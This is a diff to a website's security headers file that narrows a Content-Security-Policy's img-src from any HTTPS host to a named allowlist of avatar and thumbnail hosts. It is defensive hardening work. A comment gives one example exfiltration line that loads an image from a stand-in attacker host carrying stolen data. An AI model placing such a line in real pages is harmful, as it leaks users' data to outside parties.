@@ -38,9 +38,21 @@
   # plus one onload= handler, and the comment widget writes inline styles. To
   # remove it from script-src, move those blocks into assets/js/ files first.
   #
-  # img-src allows https: because commenter avatars and uploaded comment images
-  # come from hosts that cannot be known in advance.
-  Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.echothread.io https://cdn.jsdelivr.net https://www.googletagmanager.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: https:; connect-src 'self' https://api.echothread.io https://api.web3forms.com https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com; frame-src https://api.echothread.io https://www.youtube.com https://www.youtube-nocookie.com https://player.vimeo.com https://clips.twitch.tv https://www.tiktok.com; form-action 'self' https://api.web3forms.com; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; upgrade-insecure-requests
+  # img-src is deliberately NOT 'https:'. A wildcard there would let a
+  # compromised third-party script exfiltrate data with
+  #   new Image().src = 'https://attacker.example/?d=' + stolen
+  # which would defeat the point of having a CSP at all. The allowlist covers:
+  #   api.echothread.io / *.echothread.io   uploaded comment images, avatars
+  #   avatars.githubusercontent.com         GitHub sign-in avatars
+  #   lh3.googleusercontent.com             Google sign-in avatars
+  #   pbs.twimg.com                         Twitter sign-in avatars
+  #   i.ytimg.com                           YouTube link-preview thumbnails
+  # Known cost: if a commenter links to an arbitrary site, EchoThread renders
+  # that site's own og:image as a preview thumbnail, and it will be blocked.
+  # The link still works; only the thumbnail is missing. Accepted deliberately.
+  # This does not close exfiltration completely - a compromised script can
+  # still navigate the page - but it removes the easy channel.
+  Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.echothread.io https://cdn.jsdelivr.net https://www.googletagmanager.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: https://api.echothread.io https://*.echothread.io https://avatars.githubusercontent.com https://lh3.googleusercontent.com https://pbs.twimg.com https://i.ytimg.com; connect-src 'self' https://api.echothread.io https://api.web3forms.com https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com; frame-src https://api.echothread.io https://www.youtube.com https://www.youtube-nocookie.com https://player.vimeo.com https://clips.twitch.tv https://www.tiktok.com; form-action 'self' https://api.web3forms.com; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; upgrade-insecure-requests
 
 # Hugo's generated images carry a content hash in the filename (_hu_<hash>),
 # so a changed image gets a new URL and these can be cached hard.
